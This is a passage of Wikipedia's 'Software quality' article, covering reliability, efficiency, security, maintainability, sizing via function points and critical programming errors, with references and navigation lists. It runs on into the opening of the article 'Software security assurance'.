Depending on the application architecture and the third-party components used (such as external libraries or frameworks), custom checks should be defined along the lines drawn by the above list of best practices to ensure a better assessment of the reliability of the delivered software.



Efficiency
[
edit
]


As with Reliability, the causes of performance inefficiency are often found in violations of good architectural and coding practice which can be detected by measuring the static quality attributes of an application. These static attributes predict potential operational performance bottlenecks and future scalability problems, especially for applications requiring high execution speed for handling complex algorithms or huge volumes of data.

Assessing performance efficiency requires checking at least the following software engineering best practices and technical attributes:



Application Architecture Practices


Appropriate interactions with expensive and/or remote resources


Data access performance and data management


Memory, network and disk space management


Compliance with Coding Practices
[
69
]
 (
Best coding practices
)


Security
[
edit
]


Software quality includes 
software security
.
[
70
]
 Many security vulnerabilities result from poor coding and architectural practices such as SQL injection or cross-site scripting.
[
71
]
[
72
]
 These are well documented in lists maintained by CWE,
[
73
]
 and the SEI/Computer Emergency Center 
(CERT)
 at Carnegie Mellon University.
[
69
]


Assessing security requires at least checking the following software engineering best practices and technical attributes:



Implementation, Management of a security-aware and hardening development process, e.g. 
Security Development Lifecycle
 (Microsoft) or IBM's Secure Engineering Framework.
[
74
]


Secure Application Architecture Practices
[
75
]
[
76
]


Multi-layer design compliance


Security best practices (Input Validation, SQL Injection, Cross-Site Scripting, Access control etc.)
[
77
]
[
78
]


Secure and good Programming Practices
[
69
]


Error & Exception handling


Maintainability
[
edit
]


Maintainability includes concepts of modularity, understandability, changeability, testability, reusability, and transferability from one development team to another. These do not take the form of critical issues at the code level. Rather, poor maintainability is typically the result of thousands of minor violations with best practices in documentation, complexity avoidance strategy, and basic programming practices that make the difference between clean and easy-to-read code vs. unorganized and difficult-to-read code.
[
79
]


Assessing maintainability requires checking the following software engineering best practices and technical attributes:





Application Architecture Practices


Architecture, Programs and Code documentation embedded in source code


Code readability


Code smells


Complexity level of transactions


Complexity of algorithms


Complexity of programming practices


Compliance with Object-Oriented and Structured Programming best practices (when applicable)


Component or pattern re-use ratio


Controlled level of dynamic coding


Coupling ratio


Dirty programming


Documentation


Hardware, OS, middleware, software components and database independence


Multi-layer design compliance


Portability


Programming Practices (code level)


Reduced 
duplicate code
 and functions


Source code file organization cleanliness




Maintainability is closely related to Ward Cunningham's concept of 
technical debt
, which is an expression of the costs resulting of a lack of maintainability. Reasons for why maintainability is low can be classified as reckless vs. prudent and deliberate vs. inadvertent,
[
80
]
[
81
]
 and often have their origin in developers' inability, lack of time and goals, their carelessness and discrepancies in the creation cost of and benefits from documentation and, in particular, maintainable 
source code
.
[
82
]




Size
[
edit
]


Measuring software size requires that the whole source code be correctly gathered, including database structure scripts, data manipulation source code, component headers, configuration files etc. There are essentially two types of software sizes to be measured, the technical size (footprint) and the functional size:



There are several 
software technical sizing
 methods that have been widely described. The most common technical sizing method is number of 
Lines of Code
 (#LOC) per technology, number of files, functions, classes, tables, etc., from which backfiring Function Points can be computed;


The most common for measuring functional size is 
function point
 analysis. Function point analysis measures the size of the software deliverable from a user's perspective. Function point sizing is done based on user requirements and provides an accurate representation of both size for the developer/estimator and value (functionality to be delivered) and reflects the business functionality being delivered to the customer. The method includes the identification and weighting of user recognizable inputs, outputs and data stores. The size value is then available for use in conjunction with numerous measures to quantify and to evaluate software delivery and performance (development cost per function point; delivered defects per function point; function points per staff month.).


The function point analysis sizing standard is supported by the International Function Point Users Group (
IFPUG
). It can be applied early in the software development life-cycle and it is not dependent on lines of code like the somewhat inaccurate Backfiring method. The method is technology agnostic and can be used for comparative analysis across organizations and across industries.

Since the inception of Function Point Analysis, several variations have evolved and the family of functional sizing techniques has broadened to include such sizing measures as COSMIC, NESMA, Use Case Points, FP Lite, Early and Quick FPs, and most recently Story Points. Function Point has a history of statistical accuracy, and has been used as a common unit of work measurement in numerous application development management (ADM) or outsourcing engagements, serving as the "currency" by which services are delivered and performance is measured.

One common limitation to the Function Point methodology is that it is a manual process and therefore it can be labor-intensive and costly in large scale initiatives such as application development or outsourcing engagements. This negative aspect of applying the methodology may be what motivated industry IT leaders to form the Consortium for IT Software Quality focused on introducing a computable metrics standard for automating the measuring of software size while the IFPUG keep promoting a manual approach as most of its activity rely on FP counters certifications.

CISQ
 defines Sizing as to estimate the size of software to support cost estimating, progress tracking or other related software project management activities. Two standards are used: 
Automated Function Points
 to measure the functional size of software and 
Automated Enhancement Points
 to measure the size of both functional and non-functional code in one measure.
[
83
]




Identifying critical programming errors
[
edit
]


  
Critical Programming Errors are specific architectural and/or coding bad practices that result in the highest, immediate or long term, business disruption risk.
[
84
]


These are quite often technology-related and depend heavily on the context, business objectives and risks. Some may consider respect for naming conventions while others – those preparing the ground for a knowledge transfer for example – will consider it as absolutely critical.

Critical Programming Errors can also be classified per CISQ Characteristics. Basic example below: 



Reliability

Avoid software patterns that will lead to unexpected behavior (
Uninitialized variable
, null pointers, etc.)


Methods, procedures and functions doing Insert, Update, Delete, Create Table or Select must include error management


Multi-thread functions should be made thread safe, for instance servlets or 
struts
 action classes must not have instance/non-final static fields


Efficiency

Ensure centralization of client requests (incoming and data) to reduce network traffic


Avoid SQL queries that don't use an index against large tables in a loop


Security

Avoid fields in servlet classes that are not final static


Avoid data access without including error management


Check control return codes and implement error handling mechanisms


Ensure input validation to avoid cross-site scripting flaws or SQL injections flaws


Maintainability

Deep inheritance trees and nesting should be avoided to improve comprehensibility


Modules should be loosely coupled (fanout, intermediaries) to avoid propagation of modifications


Enforce homogeneous naming conventions


Operationalized quality models
[
edit
]


Newer proposals for quality models such as 
Squale
 and Quamoco
[
85
]
 propagate a direct integration of the definition of quality attributes and measurement. By breaking down quality attributes or even defining additional layers, the complex, abstract quality attributes (such as reliability or maintainability) become more manageable and measurable. Those quality models have been applied in industrial contexts but have not received widespread adoption.



See also
[
edit
]




Accessibility


Availability


Best coding practices


Coding conventions


Cohesion
 and 
Coupling


Computer bug


Cyclomatic complexity


Defect criticality


Dependability


GQM


ISO/IEC 9126


Software Process Improvement and Capability Determination - ISO/IEC 15504


Programming style


Quality
: 
quality control
, 
total quality management
.


Requirements management


Scope (project management)


Security


Security engineering


Software architecture


Software bug


Software quality assurance


Software quality control


Software metrics


Software reusability


Software standard


Software testing


Static program analysis


Testability




Further reading
[
edit
]


Android
 OS 
Quality Guidelines
 including checklists for UI, Security, etc. July 2021


Association of Maritime Managers in Information Technology & Communications (AMMITEC). 
Maritime Software Quality Guidelines
. September 2017


Capers Jones
 and Olivier Bonsignour, "The Economics of Software Quality", Addison-Wesley Professional, 1st edition, December 31, 2011, 
ISBN
 
978-0-13-258220-9


CAT Lab - CNES Code Analysis Tools Laboratory
 (on GitHub)


Girish Suryanarayana, Software Process versus Design Quality: Tug of War?
[
86
]


Ho-Won Jung, Seung-Gweon Kim, and Chang-Sin Chung. 
Measuring software product quality: A survey of ISO/IEC 9126
. 
IEEE Software
, 21(5):10–13, September/October 2004.


International Organization for Standardization. 
Software Engineering—Product Quality—Part 1: Quality Model
. ISO, Geneva, Switzerland, 2001. ISO/IEC 9126-1:2001(E).


Measuring Software Product Quality: the ISO 25000 Series and CMMI (SEI site)


MSQF - A measurement based software quality framework
 Cornell University Library


Omar Alshathry, Helge Janicke, "Optimizing Software Quality Assurance," compsacw, pp. 87–92, 2010 IEEE 34th Annual Computer Software and Applications Conference Workshops, 2010.


Robert L. Glass. 
Building Quality Software
. Prentice Hall, Upper Saddle River, NJ, 1992.


Roland Petrasch, "
The Definition of 'Software Quality': A Practical Approach
", ISSRE, 1999


Software Quality Professional,
[
87
]
 
American Society for Quality
 (ASQ)


Software Quality Journal
[
88
]
 by 
Springer Nature


Spinellis, Diomidis (2006-04-04). 
Code quality: the open source perspective
. Upper Saddle River, New Jersey, US: Addison-Wesley Professional. 
ISBN
 
978-0-321-16607-4
.


Stephen H. Kan. 
Metrics and Models in Software Quality Engineering
. Addison-Wesley, Boston, MA, second edition, 2002.


Stefan Wagner. 
Software Product Quality Control
. Springer, 2013.


References
[
edit
]


Notes








^
 
"Learning from history: The case of Software Requirements Engineering – Requirements Engineering Magazine"
. 
Learning from history: The case of Software Requirements Engineering – Requirements Engineering Magazine
. Retrieved 
2021-02-25
.




^
 
Pressman, Roger S.
 (2005). 
Software Engineering: A Practitioner's Approach
 (Sixth International ed.). McGraw-Hill Education. p. 388. 
ISBN
 
0071267824
.




^
 
"About the Automated Source Code Quality Measures Specification Version 1.0"
. 
www.omg.org
. Retrieved 
2021-02-25
.




^
 
"How to Perform End-to-End Testing"
. 
smartbear.com
. Retrieved 
2021-02-25
.




^
 
"How to Deliver Resilient, Secure, Efficient, and Easily Changed IT Systems in Line with CISQ Recommendations"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2013-12-28
. Retrieved 
2013-10-18
.




^
 
Fundamentals of Software Architecture: An Engineering Approach
. O'Reilly Media. 2020. 
ISBN
 
978-1492043454
.




^
 
"ISO/IEC 25010:2011"
. 
ISO
. Retrieved 
2021-02-23
.




^
 
Armour, Phillip G. (2012-06-01). 
"A measure of control"
. 
Communications of the ACM
. 
55
 (6): 26–28. 
doi
:
10.1145/2184319.2184329
. 
ISSN
 
0001-0782
. 
S2CID
 
6059054
.




^
 
Voas, J. (November 2011). 
"Software's secret sauce: the "-ilities" [software quality]"
. 
IEEE Software
. 
21
 (6): 14–15. 
doi
:
10.1109/MS.2004.54
. 
ISSN
 
1937-4194
.




^
 
"Code Quality Standards | CISQ - Consortium for Information & Software Quality"
. 
www.it-cisq.org
. Retrieved 
2021-02-25
.




^
 
"Software Sizing Standards | CISQ - Consortium for Information & Software Quality"
. 
www.it-cisq.org
. Retrieved 
2021-02-25
.




^
 
J. Bohnet, J. Döllner
 
Archived
 2014-04-27 at the 
Wayback Machine
, "Monitoring Code Quality and Development Activity by Software Maps". Proceedings of the IEEE ACM ICSE Workshop on Managing Technical Debt, pp. 9-16, 2011.




^
 
"IIA - Global Technology Audit Guide: IT Change Management: Critical for Organizational Success"
. 
na.theiia.org
. Retrieved 
2021-02-26
.




^
 
Boursier, Jérôme (2018-01-11). 
"Meltdown and Spectre fallout: patching problems persist"
. 
Malwarebytes Labs
. Retrieved 
2021-02-26
.




^
 
"Best practices for software updates - Configuration Manager"
. 
docs.microsoft.com
. Retrieved 
2021-02-26
.




^
 
Wright, Hyrum K. (2009-08-25). 
"Release engineering processes, models, and metrics"
. 
Proceedings of the doctoral symposium for ESEC/FSE on Doctoral symposium
. ESEC/FSE Doctoral Symposium '09. Amsterdam, the Netherlands: Association for Computing Machinery. pp. 27–28. 
doi
:
10.1145/1595782.1595793
. 
ISBN
 
978-1-60558-731-8
. 
S2CID
 
10483918
.




^
 
van der Hoek, André; Hall, Richard S.; Heimbigner, Dennis; Wolf, Alexander L. (November 1997). 
"Software release management"
. 
ACM SIGSOFT Software Engineering Notes
. 
22
 (6): 159–175. 
doi
:
10.1145/267896.267909
. 
ISSN
 
0163-5948
.




^
 
Sutton, Mike; Moore, Tym (2008-07-30). 
"7 Ways to Improve Your Software Release Management"
. 
CIO
. Retrieved 
2021-02-26
.




^
 
Clark, Mitchell (2021-02-24). 
"iRobot says it'll be a few weeks until it can clean up its latest Roomba software update mess"
. 
The Verge
. Retrieved 
2021-02-25
.




^
 
"Top 25 Software Errors"
. 
www.sans.org
. Retrieved 
2021-02-25
.




^
 
"
'Turn it Off and On Again Every 149 Hours' Is a Concerning Remedy for a $300 Million Airbus Plane's Software Bug"
. 
Gizmodo
. 30 July 2019
. Retrieved 
2021-02-25
.




^
 
"MISRA C, Toyota and the Death of Task X"
. Retrieved 
2021-02-25
.




^
 
"An Update on Toyota and Unintended Acceleration « Barr Code"
. 
embeddedgurus.com
. Retrieved 
2021-02-25
.




^
 
Medical Devices: The Therac-25*
 
Archived
 2008-02-16 at the 
Wayback Machine
, Nancy Leveson, University of Washington




^
 
Embedded Software
 
Archived
 2010-07-05 at the 
Wayback Machine
, Edward A. Lee, To appear in Advances in Computers
(
Marvin Victor Zelkowitz
, editor), Vol. 56, Academic Press, London, 2002, Revised from UCB ERL Memorandum M01/26
University of California, Berkeley, CA 94720, USA, November 1, 2001




^
 
"Aircraft Certification Software and Airborne Electronic Hardware"
. 
Archived
 from the original on 4 October 2014
. Retrieved 
28 September
 2014
.




^
 
"The Cost of Poor Software Quality in the US: A 2020 Report | CISQ - Consortium for Information & Software Quality"
. 
www.it-cisq.org
. Retrieved 
2021-02-25
.




^
 
"What is Waste? | Agile Alliance"
. 
Agile Alliance |
. 20 April 2016
. Retrieved 
2021-02-25
.




^
 
Matteson, Scott (January 26, 2018). 
"Report: Software failure caused $1.7 trillion in financial losses in 2017"
. 
TechRepublic
. Retrieved 
2021-02-25
.




^
 
Cohane, Ryan (2017-11-16). 
"Financial Cost of Software Bugs"
. 
Medium
. Retrieved 
2021-02-25
.




^
 
Eloff, Jan; Bella, Madeleine Bihina (2018), 
"Software Failures: An Overview"
, 
Software Failure Investigation
, Cham: Springer International Publishing, pp. 7–24, 
doi
:
10.1007/978-3-319-61334-5_2
, 
ISBN
 
978-3-319-61333-8
, retrieved 
2021-02-25




^
 
"Poor software quality cost businesses $2 trillion last year and put security at risk"
. 
CIO Dive
. Retrieved 
2021-02-26
.




^
 
"Synopsys-Sponsored CISQ Research Estimates Cost of Poor Software Quality in the US $2.08 Trillion in 2020"
. 
finance.yahoo.com
. Retrieved 
2021-02-26
.




^
 
"What Does a Data Breach Cost in 2020?"
. 
Digital Guardian
. 2020-08-06
. Retrieved 
2021-03-08
.




^
 
"Cost of a Data Breach Report 2020 | IBM"
. 
www.ibm.com
. 2020
. Retrieved 
2021-03-08
.




^
 
"ISO - ISO 9000 family — Quality management"
. 
ISO
. Retrieved 
2021-02-24
.




^
 
"ISO/IEC/IEEE 24765:2017"
. 
ISO
. Retrieved 
2021-02-24
.




^ 
a
 
b
 
"Mastering automotive software"
. 
www.mckinsey.com
. Retrieved 
2021-02-25
.




^
 
"ISO/IEC 25010:2011"
. 
ISO
. Retrieved 
2021-02-24
.




^
 
Wallace, D.R. (2002). 
"Practical software reliability modeling"
. 
Proceedings 26th Annual NASA Goddard Software Engineering Workshop
. Greenbelt, MD, USA: IEEE Comput. Soc. pp. 147–155. 
doi
:
10.1109/SEW.2001.992668
. 
ISBN
 
978-0-7695-1456-7
. 
S2CID
 
57382117
.




^
 
"ISO/IEC 25023:2016"
. 
ISO
. Retrieved 
2023-11-06
.




^
 
"What is Software Quality? | ASQ"
. 
asq.org
. Retrieved 
2021-02-24
.




^
 
"SAMATE - Software Assurance Metrics And Tool Evaluation project main page"
. 
NIST
. 3 February 2021
. Retrieved 
2021-02-26
.




^
 
Software extension to the PMBOK guide
. Project Management Institute (5th ed.). Newtown Square, Pennsylvania. 2013. 
ISBN
 
978-1-62825-041-1
. 
OCLC
 
959513383
.
{{
cite book
}}
:  CS1 maint: location missing publisher (
link
) CS1 maint: others (
link
)




^
 
Shewart, Walter A. (2015). 
Economioc control of quality of manufactured product
. [Place of publication not identified]: Martino Fine Books. 
ISBN
 
978-1-61427-811-5
. 
OCLC
 
1108913766
.




^
 
Kitchenham, B.
; Pfleeger, S. L. (January 1996). 
"Software quality: the elusive target [special issues section]"
. 
IEEE Software
. 
13
 (1): 12–21. 
doi
:
10.1109/52.476281
. 
ISSN
 
1937-4194
.




^
 
Garvin, David A. (1988). 
Managing quality : the strategic and competitive edge
. New York: Free Press. 
ISBN
 
0-02-911380-6
. 
OCLC
 
16005388
.




^ 
a
 
b
 
B. Kitchenham
 and S. Pfleeger, "Software quality: the elusive target", IEEE Software, vol. 13, no. 1, pp. 12–21, 1996.




^
 
Kan, Stephen H. (2003). 
Metrics and models in software quality engineering
 (2nd ed.). Boston: Addison-Wesley. 
ISBN
 
0-201-72915-6
. 
OCLC
 
50149641
.




^
 
International Organization for Standardization, "ISO/IEC 9001: Quality management systems -- Requirements," 1999.




^
 
W. E. Deming, "Out of the crisis: quality, productivity and competitive position". Cambridge University Press, 1988.




^
 
A. V. Feigenbaum, "Total Quality Control", McGraw-Hill, 1983.




^
 
J.M. Juran, "Juran's Quality Control Handbook", McGraw-Hill, 1988.




^
 
Weinberg, Gerald M. (1991). 
Quality software management: Volume 1, Systems Thinking
. New York, N.Y.: Dorset House. 
ISBN
 
0-932633-22-6
. 
OCLC
 
23870230
.




^
 
Weinberg, Gerald M. (1993). 
Quality software management: Volume 2, First-Order Measurement
. New York, N.Y.: Dorset House. 
ISBN
 
0-932633-22-6
. 
OCLC
 
23870230
.




^
 
Crosby, P., 
Quality is Free
, McGraw-Hill, 1979




^
 
"SUP.9 – Problem Resolution Management - Kugler Maag Cie"
. 
www.kuglermaag.com
. Retrieved 
2021-02-25
.




^ 
a
 
b
 
Hoipt (2019-11-29). 
"Organizations often use the terms 'Quality Assurance' (QA) vs 'Quality Control' (QC)…"
. 
Medium
. Retrieved 
2021-02-25
.




^
 
Wallace, D.; Watson, A. H.; Mccabe, T. J. (1996-08-01). 
"Structured Testing: A Testing Methodology Using the Cyclomatic Complexity Metric"
. 
NIST
.




^
 
Bellairs, Richard. 
"What Is Code Quality? And How to Improve Code Quality"
. 
Perforce Software
. Retrieved 
2021-02-28
.




^
 
"OMG Whitepaper | CISQ - Consortium for Information & Software Quality"
. 
www.it-cisq.org
. Retrieved 
2021-02-26
.




^
 
"How to Deliver Resilient, Secure, Efficient and Agile IT Systems in Line with CISQ Recommendations - Whitepaper | Object Management Group"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2013-12-28
. Retrieved 
2013-10-18
.




^
 
"Software Size Measurement: A Framework for Counting Source Statements"
. 
resources.sei.cmu.edu
. 31 August 1992
. Retrieved 
2021-02-24
.




^
 
Halstead, Maurice H. (1977). 
Elements of Software Science (Operating and programming systems series)
. USA: Elsevier Science Inc. 
ISBN
 
978-0-444-00205-1
.




^
 
Chidamber, S. R.; Kemerer, C. F. (June 1994). 
"A metrics suite for object oriented design"
. 
IEEE Transactions on Software Engineering
. 
20
 (6): 476–493. 
doi
:
10.1109/32.295895
. 
hdl
:
1721.1/48424
. 
ISSN
 
1939-3520
. 
S2CID
 
9493847
.




^
 
Nygard, Michael (2007). 
Release It!
. an O'Reilly Media Company Safari (1st ed.). Pragmatic Bookshelf. 
ISBN
 
978-0978739218
. 
OCLC
 
1102387436
.




^
 
"CWE - Common Weakness Enumeration"
. 
cwe.mitre.org
. 
Archived
 from the original on 2016-05-10
. Retrieved 
2016-05-20
.




^
 
Boehm, B., Brown, J.R., Kaspar, H., Lipow, M., MacLeod, G.J., & Merritt, M.J. (1978). Characteristics of Software Quality. North-Holland.




^ 
a
 
b
 
c
 
"SEI CERT Coding Standards - CERT Secure Coding - Confluence"
. 
wiki.sei.cmu.edu
. Retrieved 
2021-02-24
.




^
 
"Code quality and code security: How are they related? | Synopsys"
. 
Software Integrity Blog
. 2019-05-24
. Retrieved 
2021-03-09
.




^
 
"Cost of a Data Breach Report 2020 | IBM"
. 
www.ibm.com
. 2020
. Retrieved 
2021-03-09
.




^
 
"Key Takeaways from the 2020 Cost of a Data Breach Report"
. 
Bluefin
. 2020-08-27
. Retrieved 
2021-03-09
.




^
 
"CWE - Common Weakness Enumeration"
. Cwe.mitre.org. 
Archived
 from the original on 2013-10-14
. Retrieved 
2013-10-18
.




^
 
Security in Development: The IBM Secure Engineering Framework | IBM Redbooks
. 2016-09-30.




^
 
Enterprise Security Architecture Using IBM Tivoli Security Solutions | IBM Redbooks
. 2016-09-30.




^
 
"Secure Architecture Design Definitions | CISA"
. 
us-cert.cisa.gov
. Retrieved 
2021-03-09
.




^
 
"OWASP Foundation | Open Source Foundation for Application Security"
. 
owasp.org
. Retrieved 
2021-02-24
.




^
 
"CWE's Top 25"
. Sans.org
. Retrieved 
2013-10-18
.




^
 
IfSQ Level-2 A Foundation-Level Standard for Computer Program Source Code
 
Archived
 2011-10-27 at the 
Wayback Machine
, Second Edition August 2008, Graham Bolton, Stuart Johnston, IfSQ, Institute for Software Quality.




^
 
Fowler, Martin (October 14, 2009). 
"TechnicalDebtQuadrant"
. 
Archived
 from the original on February 2, 2013
. Retrieved 
February 4,
 2013
.




^
 
"Code quality: a concern for businesses, bottom lines, and empathetic programmers"
. 
Stack Overflow
. 2021-10-18
. Retrieved 
2023-12-05
.




^
 
Prause, Christian; Durdik, Zoya (June 3, 2012). "Architectural design and documentation: Waste in agile development?". 
2012 International Conference on Software and System Process (ICSSP)
. IEEE Computer Society. pp. 130–134. 
doi
:
10.1109/ICSSP.2012.6225956
. 
ISBN
 
978-1-4673-2352-9
. 
S2CID
 
15216552
.




^
 
"Software Sizing Standards | CISQ - Consortium for Information & Software Quality"
. 
www.it-cisq.org
. Retrieved 
2021-01-28
.




^
 
"Why Software fails"
. 
IEEE Spectrum: Technology, Engineering, and Science News
. 2 September 2005
. Retrieved 
2021-03-20
.




^
 
Wagner, Stefan; Goeb, Andreas; Heinemann, Lars; Kläs, Michael; Lampasona, Constanza; Lochmann, Klaus; Mayr, Alois; Plösch, Reinhold; Seidl, Andreas (2015). 
"Operationalised product quality models and assessment: The Quamoco approach"
 
(PDF)
. 
Information and Software Technology
. 
62
: 101–123. 
arXiv
:
1611.09230
. 
doi
:
10.1016/j.infsof.2015.02.009
. 
S2CID
 
10992384
.




^
 
Suryanarayana, Girish (2015). 
"Software Process versus Design Quality: Tug of War?"
. 
IEEE Software
. 
32
 (4): 7–11. 
doi
:
10.1109/MS.2015.87
. 
S2CID
 
9226051
.




^
 
"Software Quality Professional | ASQ"
. 
asq.org
. Retrieved 
2021-01-28
.




^
 
"Software Quality Journal"
. 
Springer
. Retrieved 
2021-01-28
.






Bibliography






Albrecht, A. J. (1979), 
Measuring application development productivity. In Proceedings of the Joint SHARE/GUIDE IBM Applications Development Symposium.
, IBM


Ben-Menachem, M.; Marliss, G. S. (1997), 
Software Quality, Producing Practical and Consistent Software
, Thomson Computer Press


Boehm, B.; Brown, J.R.; Kaspar, H.; Lipow, M.; MacLeod, G.J.; Merritt, M.J. (1978), 
Characteristics of Software Quality
, North-Holland.


Chidamber, S.; Kemerer, C. (1994), 
A Metrics Suite for Object Oriented Design. IEEE Transactions on Software Engineering, 20 (6)
, pp. 476–493


Ebert, Christof; Dumke, Reiner, 
Software Measurement: Establish - Extract - Evaluate - Execute
, Kindle Edition, p. 91


Garmus, D.; Herron, D. (2001), 
Function Point Analysis
, Addison Wesley


Halstead, M.E. (1977), 
Elements of Software Science
, Elsevier North-Holland


Hamill, M.; Goseva-Popstojanova, K. (2009), 
Common faults in software fault and failure data. IEEE Transactions of Software Engineering, 35 (4)
, pp. 484–496


Jackson, D.J. (2009), 
A direct path to dependable software. Communications of the ACM, 52 (4).


Martin, R. (2001), 
Managing vulnerabilities in networked systems
, IEEE Computer.


McCabe, T. (December 1976), 
A complexity measure. IEEE Transactions on Software Engineering


McConnell, Steve (1993), 
Code Complete
 (First ed.), Microsoft Press


Nygard, M.T. (2007), 
Release It! Design and Deploy Production Ready Software
, The Pragmatic Programmers.


Park, R.E. (1992), 
Software Size Measurement: A Framework for Counting Source Statements. (CMU/SEI-92-TR-020).
, Software Engineering Institute, Carnegie Mellon University


Pressman, Roger S.
 (2005). 
Software Engineering: A Practitioner's Approach
 (Sixth International ed.). McGraw-Hill Education. 
ISBN
 
0071267824
.


Spinellis, D. (2006), 
Code Quality
, Addison Wesley




External links
[
edit
]








Wikimedia Commons has media related to 
Software quality
.




When code is king: Mastering automotive software excellence
 (McKinsey, 2021)


Embedded System Software Quality: Why is it so often terrible? What can we do about it?
 (by 
Philip Koopman
)


Code Quality Standards
 by 
CISQ
™


CISQ Blog: 
https://blog.it-cisq.org


Guide to software quality assurance
 (ESA)


Guide to applying the ESA software engineering standards to small software projects
 (ESA)


An Overview of ESA Software Product Assurance Services
 (NASA/ESA)


Our approach to quality in Volkswagen Software Dev Center Lisbon


Google Style Guides


Ensuring Product Quality at Google
 (2011)


NASA Software Assurance


NIST Software Quality Group


OMG/CISQ 
Automated Function Points
 (
ISO/IEC 19515
)


OMG Automated Technical Debt Standard


Automated Quality Assurance
 (articled in 
IREB
 by Harry Sneed)


Structured Testing: A Testing Methodology Using the Cyclomatic Complexity Metric
 (1996)


Analyzing Application Quality by Using Code Analysis Tools
 (Microsoft, Documentation, Visual Studio, 2016)


v
t
e
Software quality
Qualities
Internal


Size


Maintainability


Flexibility


Portability


Reusability


Readability


Scalability


Testability


Understandability


Loose coupling


Orthogonality


External


Usability


Reliability


Adaptability


Correctness


Accuracy


Efficiency


Robustness


Security


Safety


Standards and lists


ISO/IEC 9126


Non-functional requirements


List of system quality attributes


Processes


Software quality management


Software quality control


Software quality assurance






 
Commons




v
t
e
Software engineering
Fields


Computer programming


DevOps


Empirical software engineering


Experimental software engineering


Formal methods


Requirements engineering


Search-based software engineering


Site reliability engineering


Social software engineering


Software deployment


Software design


Software maintenance


Software testing


Systems analysis


Concepts


Abstraction


Component-based software engineering


Software compatibility


Backward compatibility


Compatibility layer


Compatibility mode


Forward compatibility


Software incompatibility


Data modeling


Enterprise architecture


Functional specification


Modeling language


Programming paradigm


Software


Software archaeology


Software architecture


Software configuration management


Software development process/methodology


Software quality


Software quality assurance


Software verification and validation


Software system


Structured analysis


Essential analysis


CI/CD


Orientations


Agile


Aspect-oriented


Object orientation


Ontology


Service orientation


SDLC


Models
Developmental


Agile


EUP


Executable UML


Incremental model


Iterative model


Prototype model


RAD


UP


Scrum


Spiral model


V-model


Waterfall model


XP


Model-driven engineering


Round-trip engineering


Other


SPICE


CMMI


Data model


ER model


Function model


Information model


Metamodeling


Object model


Systems model


View model


Languages


IDEF


UML


USL


SysML


Related fields


Computer science


Computer engineering


Information science


Project management


Risk management


Systems engineering




 
Commons


 
Category




v
t
e
Computer science
Note: This template roughly follows the 2012 
ACM Computing Classification System
.
Hardware


Printed circuit board


Peripheral


Integrated circuit


Very Large Scale Integration


Systems on Chip (SoCs)


Energy consumption (Green computing)


Electronic design automation


Hardware acceleration


Processor


Size
 / 
Form


Computer systems organization


Computer architecture


Computational complexity


Dependability


Embedded system


Real-time computing


Networks


Network architecture


Network protocol


Network components


Network scheduler


Network performance evaluation


Network service


Software organization


Interpreter


Middleware


Virtual machine


Operating system


Software quality


Software notations
 and 
tools


Programming paradigm


Programming language


Compiler


Domain-specific language


Modeling language


Software framework


Integrated development environment


Software configuration management


Software library


Software repository


Software development


Control variable


Software development process


Requirements analysis


Software design


Software construction


Software deployment


Software engineering


Software maintenance


Programming team


Open-source model


Theory of computation


Model of computation


Stochastic


Formal language


Automata theory


Computability theory


Computational complexity theory


Logic


Semantics


Algorithms


Algorithm design


Analysis of algorithms


Algorithmic efficiency


Randomized algorithm


Computational geometry


Mathematics of 
computing


Discrete mathematics


Probability


Statistics


Mathematical software


Information theory


Mathematical analysis


Numerical analysis


Theoretical computer science


Information systems


Database management system


Information storage systems


Enterprise information system


Social information systems


Geographic information system


Decision support system


Process control system


Multimedia information system


Data mining


Digital library


Computing platform


Digital marketing


World Wide Web


Information retrieval


Security


Cryptography


Formal methods


Security hacker


Security services


Intrusion detection system


Hardware security


Network security


Information security


Application security


Human–computer interaction


Interaction design


Social computing


Ubiquitous computing


Visualization


Accessibility


Concurrency


Concurrent computing


Parallel computing


Distributed computing


Multithreading


Multiprocessing


Artificial intelligence


Natural language processing


Knowledge representation and reasoning


Computer vision


Automated planning and scheduling


Search methodology


Control method


Philosophy of artificial intelligence


Distributed artificial intelligence


Machine learning


Supervised learning


Unsupervised learning


Reinforcement learning


Multi-task learning


Cross-validation


Graphics


Animation


Rendering


Photograph manipulation


Graphics processing unit


Mixed reality


Virtual reality


Image compression


Solid modeling


Applied computing


Quantum Computing


E-commerce


Enterprise software


Computational mathematics


Computational physics


Computational chemistry


Computational biology


Computational social science


Computational engineering


Differentiable computing


Computational healthcare


Digital art


Electronic publishing


Cyberwarfare


Electronic voting


Video games


Word processing


Operations research


Educational technology


Document management




 
Category


 
Outline


 
Glossaries












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Software_quality&oldid=1238690583
"


Categories
: 
Software quality
Systems thinking
Software testing
Source code
Hidden categories: 
Webarchive template wayback links
CS1 maint: location missing publisher
CS1 maint: others
Articles with short description
Short description is different from Wikidata
Articles needing additional references from December 2021
All articles needing additional references
All articles with unsourced statements
Articles with unsourced statements from February 2021
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






This article has multiple issues.
 Please help 
improve it
 or discuss these issues on the 
talk page
. 
(
Learn how and when to remove these messages
)




This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Software security assurance"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
December 2010
)
 (
Learn how and when to remove this message
)


This article 
is written like 
a manual or guide
.
 Please help 
rewrite this article
 and remove advice or instruction.
 
(
June 2014
)




 (
Learn how and when to remove this message
)


Software security assurance
 is a process that helps design and implement 
software
 that protects the 
data
 and 
resources
 contained in and controlled by that software. Software is itself a resource and thus must be afforded appropriate 
security
.





What is software security assurance?
[
edit
]


Software Security Assurance (SSA) is the process of ensuring that 
software
 is designed to operate at a level of security that is consistent with the potential harm that could result from the loss, inaccuracy, alteration, unavailability, or misuse of the data and resources that it uses, controls, and protects.
[
1
]


The software security assurance process begins by identifying and categorizing the information that is to be contained in, or used by, the software. The information should be categorized according to its 
sensitivity
. For example, in the lowest category, the impact of a security violation is minimal (i.e. the impact on the software owner's mission, functions, or reputation is negligible). For a top category, however, the impact may pose a threat to human life; may have an irreparable impact on software owner's missions, functions, image, or reputation; or may result in the loss of significant assets or resources.

Once the information is categorized, security requirements can be developed. The security requirements should address 
access control
, including 
network
 access and physical access; data management and data access; environmental controls (power, air conditioning, etc.) and 
off-line storage
; human resource security; and audit trails and usage records.



What causes software security problems?
[
edit
]


